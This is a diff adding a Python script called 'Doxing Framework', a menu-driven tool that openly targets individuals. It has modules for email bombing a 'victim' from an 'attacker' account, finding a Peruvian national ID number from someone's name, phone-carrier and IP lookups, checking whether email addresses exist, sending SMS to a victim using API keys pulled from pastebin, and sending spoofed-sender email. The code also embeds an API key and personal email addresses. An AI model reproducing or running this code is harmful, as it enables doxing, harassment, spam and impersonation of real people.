@@ -1,0 +1,785 @@
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
+
+#######################################
+#                                     #
+#           Doxing Framework          #
+#                                     #
+#  Tool made by: Sempatte             #
+#  Date: 18 June, 2018                #
+#  Version: 1.3                       #
+#  Link: www.fuck-society.com         #
+#                                     #
+#######################################
+
+import sys, os, getpass, smtplib, time, json, signal, webbrowser, argparse
+ 
+from colorama import Fore
+
+def ClearS():
+    if os.name == "nt":
+        os.system("cls")
+    elif os.name == "posix":
+        os.system("clear")
+    else:
+        pass
+from libs.modules import CheckM, pprint
+from libs.modules import DeleteCache
+
+def _ctrlc(signal, frame):
+    print Fore.YELLOW + '\n\n[Canceled by user: Ctrl+C Detected.] Exiting of' + Fore.GREEN +  ' |DoxingFramework| ...'
+    time.sleep(2)
+    DeleteCache()
+
+signal.signal(signal.SIGINT, _ctrlc)
+
+ClearS()
+
+# posix: Linux
+# nt: Windows
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-d", "--depelover", help="Developer executes as way", action="store_true")
+args = parser.parse_args()
+
+if args.depelover:
+    import pip, pycurl, urllib, lxml, requests, mechanize
+    from grab import Grab, error
+    from urllib2 import urlopen
+    from bs4 import BeautifulSoup
+    from colorama import *
+    from io import BytesIO
+    from libs.view import *
+    if os.name == "nt":
+        init(convert=True)
+        os.system('mode 800')
+    elif os.name == "posix":
+        init(convert=False)
+else:
+    if os.name == "nt":
+        os.system("color 6")
+        print "\n [!]::[Check Dependencies]: \n"
+    else:
+        print "\n [!]::[Check Dependencies]: \n"
+        pass
+
+    from io import BytesIO
+
+
+    try:
+        import pip
+        pprint(Module_E="pip")
+        time.sleep(1)
+    except:
+        pass
+
+    try:
+        import pycurl
+        pprint(Module_E="pycurl")
+        time.sleep(1)
+    except ImportError:
+        CheckM(Module="pycurl")
+
+    def connected(host='http://google.com'):
+        try:
+            urlopen(host)
+            return True
+        except:
+            return False
+    """
+    if connected():
+      import pycurl
+      buffer = BytesIO()
+      c = pycurl.Curl()
+      c.setopt(c.URL, 'https://ipv4.wtfismyip.com/text')
+      c.setopt(c.WRITEDATA, buffer)
+      c.perform()
+      c.close()
+      body = buffer.getvalue()
+      ip = body.decode('iso-8859-1')
+      op_sys = platform.system()
+      if os.name == 'nt':
+        IP_PV = ' [Y]::[Connectivity to Internet]: YES!'
+        PV = ' [Y]::[DISTRO / O.S]: ' + op_sys
+      elif os.name == 'posix':
+        IP_PV = ' [✓]::[Connectivity to Internet]: YES!'
+        PV = ' [✓]::[DISTRO / O.S]: ' + op_sys
+      print IP_PV
+      print PV
+    else:
+      if os.name == 'nt':
+        IP_PV = ' [N]::[Connectivity to Internet]: NO!'
+      elif os.name == 'posix':
+        IP_PV = ' [✘]::[Connectivity to Internet]: NO!'
+      print IP_PV
+      print "\n [!] Please check your Internet Connectivity. "
+      sys.exit()
+    """
+
+    try:
+        import urllib
+        pprint(Module_E="urllib")
+        time.sleep(1)
+    except ImportError:
+        CheckM(Module="urllib")
+
+    try:
+        from grab import Grab, error
+        pprint(Module_E="grab")
+        time.sleep(1)
+    except ImportError:
+        CheckM(Module="grab")
+
+    try:
+        from urllib2 import urlopen
+        pprint(Module_E="urllib2")
+        time.sleep(1)
+    except ImportError:
+        CheckM(Module="urllib2")
+
+    try:
+        import lxml
+        pprint(Module_E="lxml")
+        time.sleep(1)
+    except ImportError:
+        CheckM(Module="lxml")
+
+    try:
+        from bs4 import BeautifulSoup
+        pprint(Module_E="bs4")
+        time.sleep(1)
+    except ImportError:
+        CheckM(Module="bs4")
+
+    try:
+        import requests
+        pprint(Module_E="requests")
+        time.sleep(1)
+    except ImportError:
+        CheckM(Module="requests")
+
+    try:
+        import mechanize
+        pprint(Module_E="mechanize")
+        time.sleep(1)
+    except ImportError:
+        CheckM(Module="mechanize")
+
+
+    try:
+        from colorama import *
+        pprint(Module_E="colorama")
+        if os.name == "nt":
+            init(convert=True)
+            os.system('mode 800')
+        elif os.name == "posix":
+            init(convert=False)
+        time.sleep(1)
+    except ImportError:
+        CheckM(Module="colorama")
+
+    time.sleep(2)
+    ClearS()
+
+    if os.name == "nt":
+        os.system('color f')
+        print Fore.WHITE
+    else:
+        pass
+
+from libs.view import *
+
+from colorama import *
+Banner()
+Menu()
+Help()
+while True:
+    print Fore.WHITE
+    choice = raw_input("\n1 ")
+    choice = choice.lower()
+
+    u = 'use '
+    O_1 = u+'pys/email_bomb' #Opcion uno (Email bomb)
+    O_2 = u+'dox/find_dni'   #Opcion dos (Find dni)
+    O_3 = u+'dox/found_op'   #Opcion tres (Found carrier)
+    O_4 = u+'dox/whois'      #Opcion cuatro (WHOIS IP)
+    O_5 = u+'dox/ve_email'   #Opcion cinco (Verifica el eMail si existe)
+    O_6 = u+'pys/send_sms'   #Opcion seis (Enviar mensajes SMS)
+    O_7 = u+'pys/fake_email' #Opcion siete (Enviar correo fake)
+
+    if choice == O_1:
+        print Fore.MAGENTA + "\n[#] Use" + Fore.RED +' back ' + Fore.MAGENTA + "to back to menu."
+        print Fore.MAGENTA + "[~] Leave blank to back the menu."
+        print Fore.WHITE
+        server = raw_input("[+] Mail server: Gmail o Hotmail/Outlook: ")
+        server = server.lower()
+
+
+        if server == 'outlook':
+            server = 'hotmail'
+        #Permitir1
+        print Fore.GREEN
+        advr = "\n[!] In order to use the '%s' MailServer correctly you must allow access\n\n"%(server)
+        if server == 'gmail':
+            print advr
+            print "Forum: https://support.google.com/a/answer/6260879?hl=es"
+            print "Direct link: https://myaccount.google.com/u/0/security?hl=es#connectedapps\n"
+            webbrowser.open_new("https://myaccount.google.com/u/0/security?hl=es#connectedapps")
+            print Fore.YELLOW + "[SWITCH] To allow the access of sure applications: " + Fore.RED + "YES"
+            pass
+        elif server == 'hotmail':
+            print advr
+            print "Direct link: https://outlook.live.com/owa/?path=/options/popandimap\n"
+            webbrowser.open_new("https://outlook.live.com/owa/?path=/options/popandimap")
+            print Fore.YELLOW + "[SWITCH] To allow that the devices and the applications should use POP: " + Fore.RED + "YES"
+            print Fore.YELLOW + "[SWITCH] It is possible to establish that the devices and the applications that they use POP eliminate Outlook's messages after unloading them. " + Fore.RED + "YES"
+            pass
+        elif server == 'back':
+            continue
+        elif server == '':
+            continue
+        else:
+            print "[!] Select a correct server.\n"
+            continue
+
+        print Fore.WHITE
+        #Correo atacante
+        M_FTA = "Mail from the attacker: "
+        user = str(raw_input('[+] '+ M_FTA))
+
+        confirm = raw_input('\n[?] Confirm? Y/N: ')
+        confirm = confirm.lower()
+
+        if confirm == 'N':
+            user = str(raw_input('\n[REPET] ' + M_FTA))
+        else:
+            pass
+
+
+        cda = ('\n[SET] ' + M_FTA + '%s')%(user)
+        print Fore.GREEN + cda
+        print Fore.WHITE
+        password = getpass.getpass('[+] Attacker password: ')
+
+        #Correo victima
+        to = raw_input('\n[+] Victima: ')
+        vct = ("[SET] Victim's Mail: %s")%(to)
+
+        C = '\n[?] Confirm? Y/N: '
+        confirm_two = raw_input(C)
+        print Fore.WHITE
+        confirm_two = confirm_two.lower()
+
+        if confirm_two == 'N':
+            vct = str(raw_input("\n[REPET] Victim's Mail: "))
+        else:
+            print Fore.GREEN + vct
+
+
+
+        #Mensaje
+        print Fore.WHITE
+        body = raw_input('[+] Message to send: ')
+
+        #Nº
+        try:
+            numero = int(raw_input('\n[+] Number of times to send:'))
+        except ValueError:
+            print "[!] Please place only numbers"
+            continue
+        nmr = ('\n[SET] N: %s')%(numero)
+
+        print Fore.GREEN + nmr
+
+        #Confirmar proceso
+        print Fore.RED
+        cfr_dos = raw_input("n[?] Are you sure you want to continue? Y/N: ")
+        print Fore.WHITE
+        if cfr_dos == 'N':
+            continue
+        else:
+            pass
+
+
+        if server == 'gmail':
+            smtp_server = 'smtp.gmail.com'
+            port = 587
+        elif server == 'hotmail':
+            smtp_server = 'smtp-mail.outlook.com'
+            port = 587
+        else:
+            print '[-] Mail server wrong, try again.'
+            continue
+
+        try:
+
+            server = smtplib.SMTP(smtp_server,port)
+            server.ehlo()
+            if smtp_server == 'smtp.gmail.com':
+                server.starttls()
+            elif smtp_server == 'smtp-mail.outlook.com':
+                server.starttls()
+
+            server.login(user,password)
+
+
+            for i in range(1, numero+1):
+                subject = os.urandom(9)
+                msg = (body)
+
+                server.sendmail(user, to ,msg)
+                sends = "\rE-mails sent: [%i]" % i
+                print sends
+                sys.stdout.flush()
+            server.quit()
+            print "\n[!] Done with success!\n"
+        except KeyboardInterrupt:
+            print "[Ctrl+C] Canceled by user."
+            sys.exit()
+        except smtplib.SMTPAuthenticationError:
+            print '\n[!] The user/email or password introduced from the attacker are wrong. Try it again.'
+            continue
+        except smtplib.SMTPServerDisconnected:
+            print '\n[!] The server was disconnected by an unknown error. Try it again.'
+            continue
+        except smtplib.SMTPConnectError:
+            print '\n[!] An Error occurred while trying to connect to the server. Check your connection.'
+            continue
+
+    elif choice == O_2:
+        print Fore.MAGENTA + "\n[~] Use" + Fore.RED +' select ' + Fore.WHITE + ' [option] ' + Fore.MAGENTA + "to select option." + Fore.WHITE + "   Ex: select p_name"
+        print Fore.MAGENTA + "[~] Leave blank to back the menu."
+        print Fore.YELLOW + '\n[p_name]          Buscar por NOMBRES \n[p_dni]           Buscar por DNI \n '
+        print Fore.WHITE
+
+        try:
+            server = raw_input('[#] Insert your option: ')
+            server = server.lower()
+        except KeyboardInterrupt:
+            print Fore.YELLOW + '\n\n[Cancelado por el usuario] Saliendo de |DoxingFramework| ... \n'
+            sys.exit()
+
+        print Fore.YELLOW
+        if server == 'select p_name' or server == 'p_name':
+
+            ape_pat = raw_input('\n[+] Insert the paternal surname: ')
+            ape_pat = ape_pat.upper()
+
+            ape_mat = raw_input('\n[+] Insert the maternal surname: ')
+            ape_mat = ape_mat.upper()
+
+            _names = raw_input('\n[+] Insert the names: ')
+            _names = _names.upper()
+
+
+            g = Grab()
+
+            try:
+                g.go('http://dniperu.online/buscador/buscardni_1.php')
+            except:
+                g.go('http://dniperu.online/buscador/buscardni_1.php')
+
+
+            g.doc.choose_form(name='form1')
+            g.doc.set_input('APE_PAT', ape_pat)
+            g.doc.set_input('APE_MAT', ape_mat)
+            g.doc.set_input('NOMBRES', _names)
+
+            g.submit()
+            g.doc.save('01010.html')
+
+            f = open ('01010.html','r')
+            mensaje = f.read()
+
+
+            names = ape_pat + ' ' + ape_mat + ' ' + _names
+
+            soup = BeautifulSoup(mensaje, 'lxml')
+
+            ############# PRINT ##############
+
+            #NOMBRES
+            print Fore.GREEN + '\n[#]Names: '
+            print Fore.CYAN + '       ' + names
+            #DNI
+
+
+            dni_f = str(soup.find("td", attrs={'style': 'width:80%;'}))
+
+            dni = dni_f.replace('A', '').replace('B', '').replace('C', '').replace('D', '').replace('E', '')
+            dni = dni.replace('F', '').replace('G', '').replace('H', '').replace('I', '').replace('J', '')
+            dni = dni.replace('K', '').replace('L', '').replace('M', '').replace('N', '').replace('Ñ', '').replace('O', '')
+            dni = dni.replace('P', '').replace('Q', '').replace('R', '').replace('S', '').replace('T', '')
+            dni = dni.replace('U', '').replace('V', '').replace('W', '').replace('X', '').replace('Y', '')
+            dni = dni.replace('Z', '').replace('<td style="width:80%;"><b>', '').replace('</b> </td>', '').replace(chr(194), '').replace(chr(160), '').replace(' ', '')
+
+
+            if dni == 'one': #Not found dni | one = NONE ;)
+                print Fore.GREEN + '[#]DNI: '
+                print Fore.CYAN + '       ' + 'NOT FOUND.'
+            else:
+                print Fore.GREEN + '[#]DNI: '
+                print Fore.CYAN + '       ' + dni + '\n'
+
+            f.close()
+
+            if os.name == "nt":
+                os.system("del /F /Q 01010.html")
+            elif os.name == "posix":
+                os.system("rm 01010.html")  
+            else:
+                pass
+
+        elif server == 'select p_dni' or server == 'p_dni':
+
+            print Fore.WHITE + "[!] In maintance."
+            continue
+
+            """
+            try:
+              br = mechanize.Browser()
+              br.set_handle_robots(False)
+              br.addheaders = [('User-agent', 'Chrome/58.0.3029.83')]
+              br.open('http://dniperu.online/buscar-nombres-y-apellidos-con-dni/')
+              br.select_form(name='form1')
+            except:
+              print Fore.RED + "[!] Verify your internet connectivity. "
+              continue
+        
+            #DATOS
+            dni_number = raw_input('\n[+] Inserte el numero de DNI: ')
+            br.form["dni"] = dni_number
+        
+            sub = br.submit()
+            datos = sub.read()
+        
+            #BeatifulSoup
+            soup = BeautifulSoup(datos, 'lxml')
+            body_tag = soup.body
+        
+            ############# PRINT ##############
+        
+            #DNI
+            print Fore.GREEN + '\n[#]DNI: '
+            print Fore.CYAN + '       ' + dni_number
+        
+            try:
+                nombres_b = str(soup.find("span", attrs={'class': 'more_info'}).getText())
+                nombres_i = nombres_b
+                print Fore.GREEN + '[#]Nombres: '
+                print Fore.CYAN + '       ' + nombres_i + '\n'
+                time.sleep(2)
+            except AttributeError:
+                print Fore.GREEN + '[#]Nombres: '
+                print Fore.CYAN + '       NO ENCONTRADO.' + '\n'
+            """
+
+        elif server == '':
+            continue
+        else:
+            print '\n' + '[!] Selecciona una opcion correcta!' + '\n'
+
+    elif choice == O_3:
+
+        print Fore.MAGENTA + "\n[~] Leave blank to back the menu."
+        print Fore.WHITE
+
+        try:
+            access_key = '7ffd7b8e4cd47b7f818dc55be7505fd8'
+            sys.stdout.write("[#] Insert the prefix and the number: +")
+            sys.stdout.flush()
+            number = raw_input()
+
+            if number == '':
+                continue
+            else:
+                pass
+
+            url = 'http://apilayer.net/api/validate?access_key={}&number={}&country_code=&format=1.json'.format(access_key, number)
+
+            r = urlopen(url)
+            text = r.read()
+
+            f = open(number+'.json','a')
+            f.write(text)
+            f.close()
+
+
+            def cargar_datos(ruta):
+                with open(ruta) as contenido:
+                    number_a = json.load(contenido)
+                    A = json.dumps(number_a, indent=4, sort_keys=True).replace('{', '').replace('}', '').replace('"', '').replace('_', ' ').replace(',', '').replace('    ', '[+] ')
+                    print Fore.GREEN
+                    if 'valid: false' in A:
+                        print "[!] Wrong number"
+                    elif 'valid: true' in A:
+                        print A.upper()
+                    elif 'code: 211' or 'success: false' in A:
+                        print "[!] Place only numbers"
+                    else:
+                        print A.upper()
+
+            ruta = number + ".json"
+            cargar_datos(ruta)
+
+
+            if os.name == "nt":
+                os.system("del /F /Q " + ruta)
+            elif os.name == "posix":
+                os.system("rm " + ruta)
+            else:
+                pass
+
+        except ValueError :
+            if os.name == "nt":
+                os.system("del /F /Q " + ruta)
+            elif os.name == "posix":
+                os.system("rm " + ruta)
+            else:
+                print "Delete the file with extention '.json'"
+
+    elif choice == O_4:
+        print Fore.MAGENTA
+
+        print "[~] Use"+ Fore.RED + ' clear ' + Fore.MAGENTA + "to clear the console."
+        print Fore.MAGENTA + "[~] Use" + Fore.RED +' back ' + Fore.MAGENTA + "to back to menu."
+
+        print Fore.WHITE
+        buffer = BytesIO()
+        c = pycurl.Curl()
+        c.setopt(c.URL, 'http://ipv4.wtfismyip.com/text')
+        c.setopt(c.WRITEDATA, buffer)
+        c.perform()
+        c.close()
+        body = buffer.getvalue()
+        ip = body.decode('iso-8859-1')
+        print 'Your IP: {}'.format(ip)
+        __ip = raw_input('[#] Insert IP: ')
+        if __ip == 'back':
+            continue
+        else:
+            pass
+        url = 'http://ipapi.co/{}/json/'.format(__ip)
+
+        try:
+            r = urlopen(url)
+            text = r.read()
+        except:
+            print Fore.RED + "\n[!] Invalid IP \n"
+            print Fore.WHITE    
+            continue
+
+        f = open(__ip+'.json','a')
+        f.write(text)
+        f.close()
+
+        def cargar_datos(ruta):
+            with open(ruta) as contenido:
+                w_ip = json.load(contenido)
+                A = json.dumps(w_ip, indent=4, sort_keys=True)
+                A = A.upper()
+
+
+                print Fore.GREEN
+                Line = '-------------------------------------------------------------------------------------------------------------------------------'
+                print Fore.YELLOW + '\n' + Line
+
+
+                dates_ip = A.replace('{', '').replace('}', '').replace('"', '').replace('    ', '[+] ').replace('_', ' ').replace(',', '')
+                if "ERROR: TRUE" in dates_ip:
+                    print Fore.RED + "\n[!] Invalid IP \n"
+                else:
+                    print dates_ip
+                    pass
+
+                print Fore.YELLOW + Line + '\n'
+                print Fore.WHITE
+        
+        try:
+            ruta = __ip + ".json"
+            cargar_datos(ruta)
+
+            if os.name == "nt":
+                os.system("del /F /Q " + ruta)
+            elif os.name == "posix":
+                os.system("rm " + ruta)
+            else:
+                pass
+        except ValueError:
+            if os.name == "nt":
+                os.system("del /F /Q " + ruta)
+            elif os.name == "posix":
+                os.system("rm " + ruta)
+            else:
+                pass
+
+    elif choice == O_5:
+        print Fore.MAGENTA + "\n\n[~] Leave blank to back the menu."
+        print Fore.WHITE
+        sys.stdout.write("[#] Insert the eMail: ")
+        sys.stdout.flush()
+        e_Mail = raw_input()
+
+        if '@' in e_Mail:
+            pass
+        elif e_Mail == '':
+            continue
+        else:
+            print Fore.RED + "\n[!] eMail Invalid! " + Fore.WHITE
+            continue
+        url_3 = 'http://api.2ip.me/email.txt?email={}'.format(e_Mail)
+
+        try:
+            OP = urlopen(url_3)
+            VW = OP.read()
+            if 'true' in VW:
+                print Fore.GREEN + "\n[+] This email " + Fore.YELLOW + e_Mail + Fore.GREEN + " if it exists\n"
+            elif 'false' in VW:
+                print Fore.RED + "\n[+] This email "  + Fore.YELLOW + e_Mail + Fore.RED + " does not exist\n"
+            else:
+                print Fore.RED + "\n[!] Limit of returned objects has been reached. Please change your IP \n"
+        except:
+            print Fore.RED + '\n[!] Check your internet conectivity'
+
+    elif choice == O_6:
+
+        def sendSMS(API_key_a, API_key_b, API_key_c, victim, message_to):
+            url_sms = 'http://api.txtlocal.com/send/?apikey={}&numbers={}&message={}&sender=AAA'.format(API_key_a, victim, message_to)
+            openurl = urlopen(url_sms)
+            readurl = openurl.read()
+            try:
+                if "Invalid number" in readurl:
+                    print "\n[!] Invalid number"
+
+                elif "Insufficient credits" in readurl or "Invalid login details" in readurl:
+                    url_b = 'http://api.txtlocal.com/send/?apikey={}&numbers={}&message={}&sender=AAA'.format(API_key_b, victim, message_to)
+                    openurl_b = urlopen(url_b)
+                    readurl_b = openurl_b.read()
+                    if "Insufficient credits" in readurl_b or "Invalid login details" in readurl_b:
+                        url_c = 'http://api.txtlocal.com/send/?apikey={}&numbers={}&message={}&sender=AAA'.format(API_key_c, victim, message_to)
+                        openurl_c = urlopen(url_c)
+                        readurl_c = openurl_c.read()
+                        if "Insufficient credits" in readurl_c or "Invalid login details" in readurl_c:
+                            print Fore.RED + "\n[!] Please contact the depelover: sempatte@protonmail.com"
+                        elif "success" in readurl_c:
+                            print Fore.GREEN + "\n[A3#] Sended!"
+                        else:
+                            pass
+                    elif "success" in readurl_b:
+                        print Fore.GREEN + "\n[A2#] Sended!"
+                    else:
+                        pass
+                elif "success" in readurl:
+                    print Fore.GREEN + "\n[A1#] Sended!"
+                else:
+                    pass
+            except UnboundLocalError:
+                print Fore.RED + "[!] Do not use space in messages"
+
+        print Fore.MAGENTA + "\n[~] Use " + Fore.RED + "'+'" + Fore.MAGENTA + " instead of space" + Fore.WHITE + " Ex: Hello+World+:)"
+        print Fore.MAGENTA + "[~] Use" + Fore.RED +' back ' + Fore.MAGENTA + "to back to menu. \n"
+        print Fore.WHITE
+        victim_number = raw_input('[+]Insert the number: +')
+
+        if victim_number == 'back':
+            continue
+        else:
+            pass
+
+        message_sms = raw_input('[+]Insert the message: ')
+
+        if message_sms == 'back':
+            continue
+        else:
+            pass
+
+        ######################### 1 ##########################
+        openurl_key_1 = urlopen('http://pastebin.com/raw/8q7kEZ8U') #b00tn0001@gmail.com
+        key_1 = openurl_key_1.read()
+
+        ######################### 2 ##########################
+        openurl_key_2 = urlopen('http://pastebin.com/raw/sEY9mSZ8') #kayzen.srihan@two0aks.com
+        key_2 = openurl_key_2.read()
+
+        ######################### 2 ##########################
+        openurl_key_3 = urlopen('http://pastebin.com/raw/zRRjPpxQ') #b00t0004@hotmail.com
+        key_3 = openurl_key_3.read()
+
+        API_key_1 = key_1
+        API_key_2 = key_2
+        API_key_3 = key_3
+
+        #Send sms
+        sendSMS(API_key_1, API_key_2, API_key_3, victim_number, message_sms)
+
+    elif choice == O_7:
+
+        print Fore.MAGENTA + "\n\n[~] Leave blank to back the menu."
+        print Fore.MAGENTA + "[~] Do not use domains like" + Fore.WHITE + " facebook.com, google.com, gmail.com, etc."
+       
+        print Fore.GREEN
+        from_name = raw_input('[#] From name: ') #Name
+
+        if from_name == '': continue
+
+        from_email = raw_input('[#] From email: ') #From email
+
+        if '@' in from_email or '@' in to:
+            pass
+        elif from_email == '' or to == '':
+            continue
+        else:
+            print Fore.RED + "\n[!] eMail Invalid! " + Fore.WHITE
+            continue
+
+        to = raw_input('[#] To: ') #To email
+
+        if to == '': continue
+
+        subject = raw_input('[#] Subject: ') #Subject
+
+        if subject == '': continue
+
+        text = raw_input('[#] Text: ') #Plain text
+
+        if text == '': continue
+
+        user_agent = 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
+        sess = requests.Session()
+        email_req = sess.post('https://prevenient-sister.000webhostapp.com/admin.php', headers={
+            'User-Agent': user_agent,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Referer': 'https://prevenient-sister.000webhostapp.com/admin.php',
+            'Upgrade-Insecure-Requests':'1',
+            'Content-Type':'application/x-www-form-urlencoded'
+        }, data={
+            'fromname': from_name,
+            'fromemail': from_email,
+            'toemail': to,
+            'subject': subject,
+            'textarea': text,
+            'Submit': 'Send'
+        })
+
+
+        if 'Email sended.' in email_req.text:
+            print Fore.YELLOW + "\n[#] Fake email sended."
+            print Fore.WHITE
+        else:
+            print Fore.RED + "[!] Email not sended."
+        
+
+    elif choice == "exit":
+        DeleteCache()
+
+    elif choice == "help":
+        ClearS()
+        Help()
+
+    elif choice == "showm":
+        ClearS()
+        Menu()
+    else:
+        ClearS()
